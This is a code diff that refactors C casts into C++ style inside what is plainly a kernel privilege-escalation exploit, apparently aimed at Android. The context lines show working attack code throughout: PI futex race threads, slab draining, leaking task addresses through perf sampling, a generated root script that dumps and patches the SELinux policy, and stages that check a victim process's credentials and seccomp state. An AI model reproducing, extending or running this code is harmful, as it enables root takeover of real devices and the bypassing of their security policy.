@@ -18,8 +18,6 @@
 
 #include "target.h"
 
-TargetProfile g_target_profile;
-
 // TODO(post-S15:SESSION-01): Pass RuntimeConfig via ExploitSession.
 // Input: const session config; output: paths without process-global aliases.
 // Retained because victim/handoff orchestration remains centralized in main.
@@ -277,13 +275,12 @@ static const struct execution_settings *execution_settings(void) {
     log_sync(); \
   } while (0)
 
-PiRaceContext g_pi_race_context;
 /* Decoupling plan: run the shared PI waiter and delegate route execution.
  * Input: currently implicit race/session state; output: completion/status.
  * Future: pi_race_waiter_worker(void *PiRaceWorkerArgs); route dispatch moves
  * to the stage controller. */
 void *waiter_thread(void *arg) {
-  PiRaceContext *race = arg;
+  auto *race = static_cast<PiRaceContext *>(arg);
   const WriteRequest *request = race->request;
   disable_rseq_for_thread();
   int tid = (int)syscall(SYS_gettid);
@@ -347,7 +344,7 @@ void *waiter_thread(void *arg) {
 /* Decoupling plan: own the target and chain PI futexes. Input: PiRaceContext;
  * output: synchronization state. Future: pi_race_owner_worker(void *context). */
 void *owner_thread(void *arg) {
-  PiRaceContext *race = arg;
+  auto *race = static_cast<PiRaceContext *>(arg);
   disable_rseq_for_thread();
   long lock_target = futex_op(
       &race->target_futex, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
@@ -373,7 +370,7 @@ void *owner_thread(void *arg) {
  * PiRaceContext, TargetProfile and RuntimeConfig; output: attempt counters.
  * Future: pi_race_consumer_worker(void *PiRaceWorkerArgs). */
 void *consumer_thread(void *arg) {
-  PiRaceContext *race = arg;
+  auto *race = static_cast<PiRaceContext *>(arg);
   disable_rseq_for_thread();
   pin_to_core(race->consumer_cpu);
   pr_info("consumer thread running on cpu=%d\n", sched_getcpu());
@@ -620,7 +617,7 @@ static void slab_drain(void) {
   int waves = (up.tv_sec > 60) ? 2 : 1;
   int batch = (up.tv_sec > 60) ? 64 : 32;
   for (int wave = 0; wave < waves; wave++) {
-    pid_t *drain = calloc((size_t)batch, sizeof(pid_t));
+    auto *drain = static_cast<pid_t *>(calloc((size_t)batch, sizeof(pid_t)));
     if (!drain) return;
     int n = 0;
     for (int i = 0; i < batch; i++) {
@@ -719,7 +716,8 @@ static void write_root_script(void) {
       "  cat /sys/fs/selinux/policy >\"$POLICY\" || return 1\n"
       "  HEADER=$(od -An -tx1 -N24 \"$POLICY\" | tr -d ' \\n')\n"
       "  case \"$HEADER\" in\n"
-      "    8cff7cf9080000005345204c696e7578????????????????) ;;\n"
+      "    8cff7cf9080000005345204c696e7578"
+      "\?\?\?\?\?\?\?\?\?\?\?\?\?\?\?\?) ;;\n"
       "    *) echo '[!] invalid policy header'; return 1 ;;\n"
       "  esac\n"
       "  # Restore missing Android netlink flags: bits 30/31, byte 23.\n"
@@ -855,9 +853,9 @@ static uintptr_t perf_find_task(void) {
     return 0;
   }
   ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
-  for (volatile int i = 0; i < 500000; i++) syscall(__NR_getpid);
+  for (int i = 0; i < 500000; i++) syscall(__NR_getpid);
   ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
-  struct perf_event_mmap_page *hdr = buf;
+  auto *hdr = static_cast<struct perf_event_mmap_page *>(buf);
   uint64_t head = hdr->data_head;
   __sync_synchronize();
   char *base = (char *)buf + 4096;
@@ -865,7 +863,8 @@ static uintptr_t perf_find_task(void) {
   uint64_t pos = hdr->data_tail;
   uintptr_t cands[256]; int nc = 0;
   while (pos < head && nc < 256) {
-    struct perf_event_header *ev = (void *)(base + (pos % dsz));
+    auto *ev = reinterpret_cast<struct perf_event_header *>(
+        base + (pos % dsz));
     if (ev->size == 0) break;
     if (ev->type == PERF_RECORD_SAMPLE) {
       char *p = (char *)ev + sizeof(*ev);
@@ -1150,7 +1149,7 @@ struct w3_stage_context {
 /* Decoupling plan: verify victim credentials through its protocol. Input:
  * W2 context; output: boolean/status. Future: stage_verify_credentials(). */
 static int verify_w2_stage(void *context) {
-  struct w2_stage_context *stage = context;
+  auto *stage = static_cast<struct w2_stage_context *>(context);
   if (write(stage->pipes->cmd_w, "C", 1) != 1) return 0;
 
   uint32_t child_uid = 9999;
@@ -1167,7 +1166,7 @@ static int verify_w2_stage(void *context) {
 /* Decoupling plan: verify the victim seccomp stage. Input: victim context;
  * output: boolean/status. Future: stage_verify_seccomp(). */
 static int verify_seccomp_probe_stage(void *context) {
-  struct w2_stage_context *stage = context;
+  auto *stage = static_cast<struct w2_stage_context *>(context);
   if (write(stage->pipes->cmd_w, "F", 1) != 1) return 0;
 
   uint32_t code = 0;
@@ -1191,7 +1190,7 @@ static int verify_seccomp_probe_stage(void *context) {
  * context; output: verified direction/status. Future:
  * select_stack_verify_leaf_direction(), storing result in its route context. */
 static int verify_leaf_dir_stage(void *context) {
-  struct w3_stage_context *stage = context;
+  auto *stage = static_cast<struct w3_stage_context *>(context);
   if (write(stage->pipes->cmd_w, "M", 1) != 1) return 0;
 
   uint32_t report = 0;
